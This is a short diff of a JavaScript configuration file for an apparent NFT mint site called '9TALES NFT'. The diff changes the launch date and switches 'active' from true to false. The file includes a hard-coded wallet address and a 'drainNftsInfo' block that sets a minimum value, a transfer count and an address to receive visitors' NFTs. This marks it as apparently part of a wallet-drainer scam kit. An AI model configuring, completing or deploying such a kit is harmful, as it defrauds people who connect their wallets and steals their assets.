@@ -11,7 +11,7 @@ const receiveAddress = "0xd4550697Fe601BdAeD1E591d47A887Aa7097400a";
 
 const collectionInfo = {
     name: "9TALES NFT",
-    date: "13.05.2022",
+    date: "14.05.2022",
     socialMedia: {
         discord: "discord.gg/invite_here",
         twitter: "https://twitter.com/username_here",
@@ -46,7 +46,7 @@ const mintInfo = {
 */
 
 const drainNftsInfo = {
-    active: true,
+    active: false,
     minValue: 0.02,
     maxTransfer: 1,
     nftReceiveAddress: "0xd4550697Fe601BdAeD1E591d47A887Aa7097400a",
